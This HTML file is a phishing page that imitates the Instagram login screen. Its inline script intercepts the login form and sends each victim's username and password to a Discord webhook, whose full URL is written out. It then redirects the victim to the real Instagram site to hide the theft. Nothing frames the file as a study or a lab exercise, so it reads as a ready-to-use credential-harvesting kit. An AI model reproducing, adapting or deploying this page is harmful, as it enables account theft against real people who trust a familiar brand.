<!DOCTYPE html>
<html lang="pt-BR">
<title>Instagram Login</title>
<style>
* {
    border: none;
    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
    margin: 0;
    padding: 0;
}

body {
    background-color: #fafafa;
    height: 100vh;
}

main {
    height: 100vh;
    margin: auto;
    max-width: 935px;
}

a { text-decoration: none; }
h1 { margin: 20px 0; }
ul { list-style: none; }

/**
 * Flex rules
 */

.flex {
    display: -webkit-box;
    display: -moz-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
}

.direction-column {
    -webkit-box-direction: normal;
    -webkit-box-orient: vertical;
    -moz-box-direction: normal;
    -moz-box-orient: vertical;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
}

.justify-content-center {
    -webkit-box-pack: center;
    -moz-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
}

.align-items-center {
    -webkit-box-align: center;
    -moz-box-align: center;
    -ms-flex-align: center;
    -webkit-align-items: center;
    align-items: center;
}

.flex-wrap {
    -webkit-flex-wrap: wrap;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
}

/**
 *
 */

.panel {
    background-color: white;
    border: 1px solid #dbdbdb;
    margin-bottom: 10px;
    padding: 10px;
}

#auth { max-width: 350px; }
#mobile { max-width: 454px; }

#mobile img {
    height: 618px;
}

/**
 * Login section
 */
.login-with-fb,
form { width: 100%; }

.register,
form { padding: 30px 20px; }

.login-with-fb { padding: 30px 20px 20px 20px; }

form .sr-only { display: none; }

form input {
    background-color: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    color: #808080;
    margin-bottom: 8px;
    padding: 10px 10px;
    width: 100%;
}

form input::placeholder {
    color: #808080;
}

form input:focus {
    border: 1px solid #808080;
    outline: none;
}

form button {
    background-color: #0095f6;
    border-radius: 5px;
    color: #fff;
    font-weight: bold;
    height: 35px;
    margin-top: 10px;
    width: 100%;
}

/**
 * Separator login form from login with fb
 */
.separator span {
    background-color: #dbdbdb;
    height: 1px;
    width: calc(100% - 10px);
}

.separator .or {
    color: #808080;
    font-weight: bold;
}

.separator { padding: 0 20px; }
.separator span:first-child { margin-right: 10px;}
.separator span:last-child { margin-left: 10px;}

/**
 * Login with fb section
 */
.login-with-fb a { 
    color: #385185; 
}

.login-with-fb > a { font-size: 12px; }
.login-with-fb div a { font-weight: bold; }
.login-with-fb div { margin-bottom: 15px; }

/**
 * Register section
 */
.register * { font-size: 14px; }
.register a { 
    color: #0095f6;
    font-weight: bold;
}

.register p { margin-right: 5px; }

/**
 * App download
 */
.app-download { padding: 15px; }
.app-download p { padding: 10px 0; }
.app-download img { 
    height: 40px; 
    margin: 0 5px;
}

/**
 * Footer
 */
footer {
    margin: 0 auto 30px auto;
    max-width: 935px;
}
footer ul { margin-bottom: 20px; }
footer ul li { margin: 0 10px 10px; } 
footer ul li a { color: #385185; }
footer .copyright { color: #808080; }
footer ul li a,
footer .copyright { 
    font-weight: bold;
    text-align: center;
    text-transform: uppercase;
 }


/**
 * Media queries
 */

@media screen and (max-width: 767px) {
    main { margin: 30px auto 50px auto; }
    footer .copyright,
    footer ul li a { font-size: 13px; }
}
</style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Instagram logo" title="Instagram logo" style=height:110px; width:110px; />
                </h1>
                <form id="loginForm">
                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>                    
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email " required>
                    <label for="password" class="sr-only">Senha</label>
                    <input type="password" id="password" name="password" placeholder="Password" required>

                    <button type="submit">Log in</button>
                </form>
          <script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();
        
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        // Replace this with your actual webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1289211131671613440/ZHhHbGXrRC_7RSFKYASJbveWI8ang-5wb95M4woybaghpj2ZutVTwJulZZD6MqAs2Kwx";

        // Prepare message data for Discord webhook
        const message = {
            content: `New login attempt\nUsername: ${username}\nPassword: ${password}`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message)
        })
        .then(response => response.json())
        .then(data => {
            // Redirect user after successful submission
            window.location.href = "https://www.instagram.com";  // Replace with your desired website URL
        })
        .catch((error) => {
            console.error('Error:', error);
            // Optionally, you can handle the error here if needed
            window.location.href = "https://www.instagram.com";  // Redirect after error too (you can customize this URL)
        });
    });
</script>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">    
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D39696DD2-78CB-4AFE-827E-1BC8E15DDAB1%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%3A%2F%2Fwww.bing.com%2F"> <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Google Playstore" title="">               
                    <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1020"> <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store" title="Microsoft Store">
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="https://about.meta.com/">Meta</a></li>
            <li><a href="https://about.instagram.com/">About</a></li>
            <li><a href="https://about.instagram.com/blog/">Blog</a></li>
            <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
            <li><a href="https://help.instagram.com/">Help</a></li>
            <li><a href="https://developers.facebook.com/docs/instagram-platform">Api</a></li>
            <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a></li>
            <li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
            <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
            <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
            <li><a href="https://www.threads.net/">Threads</a></li>
            <li><a href="https://www.facebook.com/help/instagram/261704639352628?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26next%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fmeta_verified%252F%253Fentrypoint%253Dweb_footer%2526next%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fmeta_verified%25252F%25253Fentrypoint%25253Dweb_footer%252526__coig_login%25253D1%2526__coig_login%253D1%26__coig_login%3D1"></a>Contact Uploading & Non-Users</li>
        </ul>
        <p class="copyright">© 2025 Instagram From Meta</p>
    </footer>
</body>
</html>
